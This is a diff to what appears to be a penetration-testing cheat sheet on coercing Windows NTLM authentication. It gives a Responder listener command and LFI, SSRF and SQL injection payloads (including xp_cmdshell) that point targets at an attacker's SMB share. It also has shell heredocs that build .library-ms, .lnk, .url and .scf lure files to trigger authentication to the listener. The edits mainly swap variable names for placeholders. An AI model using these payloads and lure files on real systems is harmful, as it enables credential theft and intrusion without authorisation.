@@ -20,11 +20,7 @@ layout:
 ## Listener
 
 ```sh
-sudo responder -I $INTERFACE -A
-```
-
-```sh
-smbserver.py share /dev/null -smb2support
+sudo responder -I <interface> -A [-v]
 ```
 
 ## Possible Attacks
@@ -35,15 +31,15 @@ If you discover a web vulnerability (such as LFI, SQLI, XXE, SSRF, SSTI) that al
 
 ```sh
 # LFI
-?page=\\$IP\shared
+?page=\\<listener_ip>\shared
 
 # SSRF
-?url=file:////$IP/shared
+?url=file:////<listener_ip>/shared
 
 # SQL Injection
-?id=1' union select null,load_file('\\\\$IP\\shared'),null-- -
-?id=1' union select null,(select x from OpenRowset(BULK '\\$IP\shared',SINGLE_CLOB) R(x)),null-- -
-?id=1' union select null,(EXEC xp_cmdshell 'dir \\$IP\shared'),null-- -
+?id=1' union select null,load_file('\\\\<listener_ip>\\shared'),null-- -
+?id=1' union select null,(select x from OpenRowset(BULK '\\<listener_ip>\shared',SINGLE_CLOB) R(x)),null-- -
+?id=1' union select null,(EXEC xp_cmdshell 'dir \\<listener_ip>\shared'),null-- -
 ```
 
 ### Via .library-ms file
@@ -55,7 +51,7 @@ cat > '!shared.library-ms' <<'EOF'
   <searchConnectorDescriptionList>
     <searchConnectorDescription>
       <simpleLocation>
-        <url>\\\\$IP\\shared</url>
+        <url>\\\\<listener_ip>\\shared</url>
       </simpleLocation>
     </searchConnectorDescription>
   </searchConnectorDescriptionList>
@@ -66,7 +62,7 @@ EOF
 ### Via .lnk file
 
 ```sh
-pylnk3 c "\\\\$IP\shared" '!shared.lnk' -i "\\\\$IP\\shared\\icon.ico"
+pylnk3 c '\\<listener_ip>\shared' '!shared.lnk' -i '\\<listener_ip>\shared\icon.ico'
 ```
 
 ### Via .url file
@@ -74,9 +70,9 @@ pylnk3 c "\\\\$IP\shared" '!shared.lnk' -i "\\\\$IP\\shared\\icon.ico"
 ```sh
 cat > '!shared.url' <<'EOF'
 [InternetShortcut]
-URL=\\\\$IP\\shared
+URL=\\\\<listener_ip>\\shared
 IconIndex=1
-IconFile=\\\\$IP\\shared\\icon.ico
+IconFile=\\\\<listener_ip>\\shared\\icon.ico
 EOF
 ```
 
@@ -86,7 +82,7 @@ EOF
 cat > '!shared.scf' <<'EOF'
 [Shell]
 Command=2
-IconFile=\\\\$IP\\shared\\icon.ico
+IconFile=\\\\<listener_ip>\\shared\\icon.ico
 [Taskbar]
 Command=ToggleDesktop
 EOF
